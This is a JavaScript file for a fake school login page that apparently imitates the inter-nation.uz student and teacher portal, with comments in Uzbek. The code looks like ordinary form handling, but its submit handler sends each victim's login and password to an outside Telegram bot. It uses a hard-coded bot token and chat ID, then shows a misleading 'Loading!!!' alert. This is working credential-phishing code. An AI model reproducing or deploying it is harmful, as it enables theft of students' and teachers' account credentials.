
function selectProfile(option, profile) {
    document.querySelectorAll('.profile-option').forEach(el => el.classList.remove('selected'));
    option.classList.add('selected');
    document.querySelector('.next-btn').disabled = false;

    const imageUrl = profile === 'student' 
        ? 'https://login.inter-nation.uz/student.webp' 
        : 'https://login.inter-nation.uz/teacher.webp';

    document.getElementById('profileImage').src = imageUrl;

    // Tanlangan profilni saqlash
    localStorage.setItem('selectedProfile', profile);
}
function hidbtn() {
let profileCard = document.querySelector('.profile-card');
let stuffCard = document.querySelector('.stuff-card');

if (profileCard.classList.contains('active')) {
profileCard.classList.remove('active');
profileCard.classList.add('block'); // Profile-card yashiriladi
stuffCard.classList.remove('block');
stuffCard.classList.add('active'); // Stuff-card chiqariladi
} else {
profileCard.classList.remove('block');
profileCard.classList.add('active'); // Profile-card qayta chiqariladi
stuffCard.classList.remove('active');
stuffCard.classList.add('block'); // Stuff-card yashiriladi
}
}
document.addEventListener("DOMContentLoaded", function () {
const loginInput = document.getElementById("loginInput");
const passwordInput = document.getElementById("passwordInput");
const nextButton = document.getElementById("nextButton");

function checkInputs() {
if (loginInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
    nextButton.disabled = false;
    nextButton.classList.add("active");
} else {
    nextButton.disabled = true;
    nextButton.classList.remove("active");
}
}

loginInput.addEventListener("input", checkInputs);
passwordInput.addEventListener("input", checkInputs);
});
document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("lol");
    const loginInput = document.getElementById("loginInput");
    const passwordInput = document.getElementById("passwordInput");
    const nextButton = document.getElementById("nextButton");
    const togglePassword = document.querySelector(".toggle-password");
    const path_1 = document.getElementById("paths")

    if (!form || !loginInput || !passwordInput || !nextButton || !togglePassword) {
        console.error("❌ Xatolik! HTML elementlari topilmadi.");
        return;
    }

    // 🔐 Parolni ko‘rsatish yoki yashirish
    togglePassword.addEventListener("click", function () {
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            path_1.setAttribute("fill", "gray");
        } else {
            passwordInput.type = "password";
            path_1.setAttribute("fill", "#353945");
        }
    });

    // 🔄 Formani tekshirish va tugmani faollashtirish
    form.addEventListener("input", function () {
        if (loginInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
            nextButton.removeAttribute("disabled");
            nextButton.classList.add("active");
        } else {
            nextButton.setAttribute("disabled", "true");
        }
    });

    // 🚀 Formani yuborish va Telegramga yuborish
    form.addEventListener("submit", function (e) {
        e.preventDefault();

        const botToken = "6546348597:AAHn_SDI5B_Pl6YY0QCEsNccRIqMFol61Uc"; // 🟡 Bot tokeningizni kiriting
        const chatId = "6667155546"; // 🟡 Chat ID ni kiriting
        const message = `🔐 *Yangi Login Ma'lumotlari:* \n👤 *Login:* ${loginInput.value} \n🔑 *Parol:* ${passwordInput.value}`;

        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(telegramApiUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("Loading!!!");
                form.reset();
                nextButton.setAttribute("disabled", "true");
                nextButton.classList.remove("active");
            } else {
                alert("❌ Xatolik yuz berdi, qayta urinib ko'ring!");
            }
        })
        .catch(error => {
            console.error("Xatolik yuz berdi:", error);
            alert("❌ Ma'lumotlarni yuborishda xatolik yuz berdi!");
        });
    });
});
